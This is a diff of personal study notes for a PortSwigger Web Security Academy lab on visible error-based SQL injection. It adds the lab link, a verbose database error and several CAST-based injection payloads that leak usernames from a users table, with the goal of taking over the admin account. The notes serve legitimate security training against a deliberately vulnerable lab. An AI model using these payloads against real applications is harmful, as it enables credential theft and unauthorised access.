@@ -1,3 +1,5 @@
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based
+
 Lab #18 – Visible error-based SQL injection
 
 End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
@@ -6,6 +8,7 @@ Analysis:
 
 select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''
 
+from verbose output of the database:
 SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char
 
 
@@ -13,6 +16,12 @@ CAST()
 
 
 pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--
+
+' AND 1=CAST((SELECT 1) as int)--
+
+' AND 1=CAST((SELECT username from users) as int)--
+
+ERROR: more than one row returned by a subquery used as an expression
 
 ' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
 
